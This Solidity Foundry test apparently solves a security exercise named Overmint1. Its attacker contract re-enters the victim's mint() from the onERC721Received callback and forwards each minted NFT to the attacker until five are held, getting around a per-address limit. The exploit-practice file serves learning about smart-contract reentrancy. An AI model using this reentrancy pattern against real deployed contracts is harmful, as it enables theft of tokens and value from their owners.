// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint1} from "./Overmint1.sol";

contract Overmint1Attacker is Test {
    AttackerContract attackerContract;
    Overmint1 victim;

    address public attacker = address(0x10);

    function setUp() external {
        victim = new Overmint1();
    }

    function testAttackerContract() external {
        console.log("address(attacker)", address(attacker));
        console.log("Overmint1Attacker", address(attackerContract));
        console.log("victim", address(victim));

        vm.startPrank(attacker);
        attackerContract = new AttackerContract();
        attackerContract.callVictimsMint(address(victim));
        vm.stopPrank();

        assertEq(victim.success(attacker), true);
        console.log(victim.balanceOf(attacker));
        assertLt(vm.getNonce(attacker), 3);
        console.log(vm.getNonce(attacker)); //why nonce is 1?
    }
}

contract AttackerContract is IERC721Receiver {
    address attackerAddress;

    function callVictimsMint(address victimsAddress) external {
        attackerAddress = msg.sender;
        Overmint1(victimsAddress).mint();
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        if (Overmint1(msg.sender).balanceOf(attackerAddress) < 5) {
            // each time received the nft, directly send to the attacker
            Overmint1(msg.sender).safeTransferFrom(address(this), attackerAddress, tokenId);
            Overmint1(msg.sender).mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
